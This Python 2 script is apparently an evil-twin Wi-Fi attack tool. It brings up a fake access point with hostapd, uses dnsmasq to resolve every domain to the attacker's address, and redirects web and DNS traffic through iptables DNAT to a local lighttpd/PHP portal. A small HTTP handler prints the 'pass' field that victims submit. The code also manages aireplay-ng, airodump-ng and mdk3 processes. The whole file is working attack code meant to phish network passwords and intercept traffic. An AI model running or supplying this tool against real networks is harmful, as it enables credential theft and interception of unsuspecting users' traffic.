#!/usr/bin/python
from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
from os import curdir, sep
import cgi,os,sys,time
from subprocess import Popen, PIPE, check_output
import socket
import shutil
#Libs Create
from depen import Dependecias
from interface import *
from conf import *

FACEJ = False

class myHandler(BaseHTTPRequestHandler):	
	def do_GET(self):
		print "pide algo"
		"""
		self.send_response(200)
		self.send_header('Content-type','text/html')
		self.end_headers()
		#Send the html message
		self.wfile.write("Hello World !")
		"""
		if self.path=="/":
			self.path="/index.html"
		if self.path.endswith(".html"):
			mimetype='text/html'
			sendReply = True
		if self.path.endswith(".ico"):
			mimetype='image/x-icon'
			sendReply = True

		f = open(curdir + sep + self.path) 
		self.send_response(200)
		self.send_header('Content-type',mimetype)
		self.end_headers()
		self.wfile.write(f.read())
		f.close()        
		return
	
	def do_POST(self):
		if self.path=="/":
			self.path="/index.html"
			mimetype='text/html'      
		form = cgi.FieldStorage(fp=self.rfile,headers=self.headers,environ={'REQUEST_METHOD':'POST','CONTENT_TYPE':self.headers['Content-Type'],})
		print "Your name is: %s" % form["pass"].value
		#self.send_response(200)
		#self.send_header('Content-type',mimetype)
		#self.end_headers()
		self.send_response(200)
		self.end_headers()
		self.wfile.write("Thanks %s !" % form["pass"].value)        
		return

class Forwaid:
	def conf(self):
		if os.path.isfile('/usr/bin/nmcli') and os.path.isfile('/usr/sbin/rfkill'):
			Popen(['nmcli', 'radio', 'wifi', 'off'],stdout=PIPE,stderr=DN).wait()
			Popen(['rfkill', 'unblock', 'wlan'],stdout=PIPE,stderr=DN).wait()
		os.system('ifconfig %s down' % conf.c_ActualInterface)
		os.system('ifconfig %s %s netmask 255.255.255.0' %(conf.c_ActualInterface,c_IP))
		os.system('ifconfig %s up' % conf.c_ActualInterface)        
		os.system('echo "1" > /proc/sys/net/ipv4/ip_forward')
		os.system('route add -net '+c_RANG_IP+'.0 netmask 255.255.255.0 gw %s'%c_IP)
		os.system('iptables --flush')
		os.system('iptables --table nat --flush')
		os.system('iptables --delete-chain')
		os.system('iptables --table nat --delete-chain')
		os.system('iptables -P FORWARD ACCEPT')
		os.system('iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination %s:80'%c_IP)
		os.system('iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination %s:%s'%(c_IP,c_ssl_port))
		os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination %s:%s'% (c_IP, 53))
		os.system('iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination %s:%s'%(c_IP,53))
		os.system('iptables -t nat -A POSTROUTING -j MASQUERADE')
		Popen(['sysctl', '-w', 'net.ipv4.conf.all.route_localnet=1'],stdout=DN,stderr=PIPE)
		
	def detenerservicion(self):
		os.system('killall hostapd')
		os.system('killall aireplay-ng')
		os.system('killall airodump-ng')
		os.system('killall lighttpd')
		os.system('killall dhcpd')
		os.system('killall mdk3')		
		os.system('pkill mdk3')
		os.system('pkill dhcpd')
		os.system('pkill airodump-ng')
		os.system('pkill aireplay-ng')
		os.system('pkill dnsmasq')
		os.system('pkill hostapd')
		os.system('pkill lighttpd')
		os.system('killall -9 dnsmasq')
		#os.system("kill $(ps a | grep python| grep fakedns | awk '{print $1}'")
		Popen(['airmon-ng','stop', conf.c_ActualInterface], stdout=DN, stderr=DN)         
		Popen(['service','stop', 'networkmanager'], stdout=DN, stderr=DN)
		os.system('echo "0" > /proc/sys/net/ipv4/ip_forward')        
		
	def borrarconf(self):
		os.system('echo "0" > /proc/sys/net/ipv4/ip_forward')
		os.system('iptables --flush')
		os.system('iptables --table nat --flush')
		os.system('iptables --delete-chain')
		os.system('iptables --table nat --delete-chain')
		
	def reiniciar(self):
		os.system('service restart networkmanager')
		os.system('killall xterm')
		shutil.rmtree(c_DUMP_PATH, True)

	def crearHttp(self):
		configHttp=(
		'server.document-root = "'+c_ACTUAL_PATH+'/data"\n'
		'server.modules = ("mod_access","mod_alias","mod_accesslog","mod_fastcgi","mod_redirect","mod_rewrite")\n'

		'fastcgi.server = ( ".php" => (("bin-path" => "/usr/bin/php-cgi","socket" => "/php.socket")))\n'

		'server.port = 80\n'
		'server.pid-file = "/var/run/lighttpd.pid"\n'
		'# server.username = "www"\n'
		'# server.groupname = "www"\n'
		'mimetype.assign = (".html" => "text/html",".htm" => "text/html",".txt" => "text/plain",".jpg" => "image/jpeg",".png" => "image/png",".css" => "text/css")\n'
		'server.error-handler-404 = "/"\n'
		'static-file.exclude-extensions = ( ".fcgi", ".php", ".rb", "~", ".inc" )\n'
		'index-file.names = ( "index.htm" )\n'
		'$HTTP["host"] =~ "^www\.(.*)$" {\n'
		'url.redirect = ( "^/(.*)" => "http://%1/$1" )\n'
		'}'
		)
		with open(''+c_DUMP_PATH+'/lighttpd.conf', 'w') as httpconfig:
			httpconfig.write(configHttp)  	 
		
	def confFakeapydhcp(self):	
		configAp = (
		'interface=%s\n'
		'driver=nl80211\n'
		'ssid=%s\n'
		'hw_mode=g\n'
		'channel=%s\n'
		'macaddr_acl=0\n'
		'ignore_broadcast_ssid=0\n'
		)	   
		configDhcp2 = (
		 'authoritative;\n' 
		 'default-lease-time 600;\n'
		 'max-lease-time 7200;\n'         
		 'subnet '+c_RANG_IP+'.0 netmask 255.255.255.0 {\n'
		 'option broadcast-address '+c_RANG_IP+'.255;\n'
		 'option routers '+c_IP+';\n'
		 'option subnet-mask 255.255.255.0;\n'
		 'option domain-name-servers '+c_IP+';\n'
		 'range '+c_RANG_IP+'.100 '+c_RANG_IP+'.250;\n'         
		 '}'
		)
		configHosts = (
			'192.168.0.1 *'
		)		
		with open(c_DUMP_PATH+'/hostapd.conf', 'w') as apconf:
			apconf.write(configAp % (conf.c_ActualInterface, c_Host_SSID, c_Host_CHAN))
			
		with open(c_DUMP_PATH+'/dhcpd.conf', 'w') as dhcpconf:           
			dhcpconf.write(configDhcp2) 

		with open(c_DUMP_PATH+'/hosts.conf', 'w') as hostss:           
			hostss.write(configHosts)

	def Dns(self):		
		config = (
		'no-resolv\n'
		'interface=%s\n'
		'dhcp-range=%s\n'
		'address=/#/%s'
		)        
		with open(''+c_DUMP_PATH+'/dns.conf', 'w') as dhcpconf:
			dhcpconf.write(config % (conf.c_ActualInterface, c_DHCP_LEASE, c_IP))		
		os.system('echo > /var/lib/misc/dnsmasq.leases')	
			
	def crearFakeAp(self):
		self.detenerservicion()
		self.conf()
		self.confFakeapydhcp()
		self.Dns()
		self.crearHttp()	   
		#Creo el Ap falso
		Popen(['xterm','-e', 'hostapd', ''+c_DUMP_PATH+'/hostapd.conf'], stdout=DN, stderr=DN)
		try:
			time.sleep(6)
		except KeyboardInterrupt:
			print "keyboar"				 
		#Creo el Dhcp y dns
		Popen(['xterm','-e','dnsmasq', '-C', ''+c_DUMP_PATH+'/dns.conf','--no-daemon','--log-queries'], stdout=PIPE, stderr=DN)
		#Creo el Lihttp
		os.system('lighttpd -f '+c_DUMP_PATH+'/lighttpd.conf')      

	def creaFakeApF2(self):
		self.detenerservicion()
		self.conf()
		self.confFakeapydhcp()
		self.crearHttp()
		#Creo Lihhtpd
		os.system('lighttpd -f '+c_DUMP_PATH+'/lighttpd.conf')
		#Creo Fake Ap
		Popen(['xterm','-e', 'hostapd', ''+c_DUMP_PATH+'/hostapd.conf'], stdout=DN, stderr=DN)
		try:
			time.sleep(6)
		except KeyboardInterrupt:
			print "keyboar"
		#Creo Dhcp
		Popen(['xterm','-e', 'dhcpd','-d','-f','-cf' ,''+c_DUMP_PATH+'/dhcpd.conf','wlan0'], stdout=DN, stderr=DN)
		#Creo Dns
		#Popen(['xterm','-title', 'FAKEDNS','-e','python','-cf' ,''+c_DUMP_PATH+'/fakedns.py'], stdout=DN, stderr=DN)
		Popen(['xterm','-e','python',''+c_ACTUAL_PATH+'/fakedns.py'], stdout=DN, stderr=DN)
		
		
class modulosparaIntall:
	def __init__(self):
		veryy = Dependecias()		

def inic():   
	print G+'By JR'+W   
	print '---------------'  
	print G+'1)'+W+' Server simple'
	print G+'2)'+W+' configurar routes'
	print G+'3)'+W+' configurar iptables'
	print G+'4)'+W+' borrar configuraciones'
	print G+'5)'+W+' Crear fake ap'
	print G+'6)'+W+' Crear fake ap2'	
	print G+'10)'+W+' Salir'
	print G+'11)'+W+' pruebas'

	if os.path.exists(c_DUMP_PATH):
		pass
	else:
		os.mkdir(c_DUMP_PATH)
	modulosparaIntall()	
	try:
		hola = raw_input("Seleciona options>: ")
	except KeyboardInterrupt:
		Forwaid().detenerservicion()
		Forwaid().borrarconf()
		Forwaid().reiniciar()
		os.system("clear")				
		sys.exit()
	if hola == "1":
		try:
			server = HTTPServer(('', c_PORT_NUMBER), myHandler)
			print 'Started httpserver on port ' , c_PORT_NUMBER
			server.serve_forever()
		except KeyboardInterrupt:
			print '^C received, shutting down the web server'
			server.socket.close()
	elif hola == "2":
		get_hostapd()
	elif hola == "3":
		vamos = Forwaid()
		vamos.conf()       
		vamos.crearWifi()
	elif hola == "4":
		vamos = Forwaid()
		vamos.borrarconf()
	elif hola == "5":
		Forwaid().crearFakeAp()
	elif hola == "6":
		Forwaid().creaFakeApF2()    
	elif hola == "10":
		vamos = Forwaid()
		vamos.borrarconf()
		vamos.detenerservicion()
		vamos.reiniciar()		
		sys.exit()
	elif hola == "11":
		print conf.c_ActualInterface
		#print FACEJ.resul()		
	inic()

def Selecinter():
	global FACEJ
	FACEJ = Interfaces()
	FACEJ.iwconfig() #Selecciona interface	

if __name__ == "__main__":
	Selecinter()
	inic()